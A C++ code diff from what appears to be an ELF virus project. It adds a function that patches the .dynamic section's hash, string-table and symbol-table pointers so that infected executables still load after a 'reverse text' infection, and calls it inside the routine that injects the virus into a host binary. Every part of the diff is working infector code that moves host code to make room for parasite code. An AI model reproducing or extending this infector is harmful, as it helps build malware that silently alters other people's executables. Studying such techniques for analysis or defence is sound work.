@@ -116,6 +116,43 @@ void patch_ehdr(Elf64_Ehdr& ehdr, const ElfReverseTextInfo& info,
   }
 }
 
+bool patch_dyamic(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
+                  const Elf64_Ehdr& ehdr, const Elf64_Shdr& shdr,
+                  const ElfReverseTextInfo& info, uint64_t padded_virus_size) {
+  if (info.original_code_segment_file_offset == 0) {
+    // if there is no vaddr adjustment to gnu hash section, skip.
+    return true;
+  }
+
+  auto section_entry_start = &shdr;
+
+  for (auto cur_entry = section_entry_start;
+       cur_entry < section_entry_start + ehdr.e_shnum; ++cur_entry) {
+    printf("current sh entry %x type %d\n", cur_entry, cur_entry->sh_type);
+    if (cur_entry->sh_type == SHT_DYNAMIC) {
+      printf("patching .dynamic\n");
+      auto* dynamic_section_entry = reinterpret_cast<Elf64_Dyn*>(
+          host_mapping.mutable_base() + cur_entry->sh_offset);
+      printf("dynamic entry %x\n", cur_entry->sh_offset);
+      while (dynamic_section_entry->d_tag != DT_NULL) {
+        printf("dynamic entry\n");
+        if (dynamic_section_entry->d_tag == DT_HASH ||
+            dynamic_section_entry->d_tag == DT_STRTAB ||
+            dynamic_section_entry->d_tag == DT_SYMTAB) {
+          if (dynamic_section_entry->d_un.d_ptr <=
+              info.original_code_segment_p_vaddr) {
+            dynamic_section_entry->d_un.d_ptr -= padded_virus_size;
+            printf("patched an entry\n");
+          }
+        }
+        dynamic_section_entry++;
+      }
+      return true;
+    }
+  }
+  return false;
+}
+
 bool get_info(const Elf64_Ehdr& ehdr, const Elf64_Phdr& phdr,
               ElfReverseTextInfo& info) {
   info.original_e_entry = ehdr.e_entry;
@@ -197,16 +234,21 @@ bool reverse_text_infect64(
   printf("patched sht\n");
 
   {
+    const auto& ehdr =
+        *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
+    const auto& shdr = *reinterpret_cast<const Elf64_Shdr*>(
+        host_mapping.mutable_base() + ehdr.e_shoff);
+    // Patch .dynamic section if we touched .gnu.hash
+    patch_dyamic(host_mapping, ehdr, shdr, info, padded_virus_size);
+  }
+
+  {
     // Patch elf header last
     auto& mutable_ehdr =
         *reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
     patch_ehdr(mutable_ehdr, info, padded_virus_size);
   }
   printf("patched ehdr\n");
-
-  // Shift host content back, starting from the beginning of CODE segment start.
-  printf("host size %x extra space %x\n", host_mapping.size(),
-         padded_virus_size);
 
   auto virus_offset = inject_virus(host_mapping, parasite_mapping, ehdr,
                                    padded_virus_size, info);
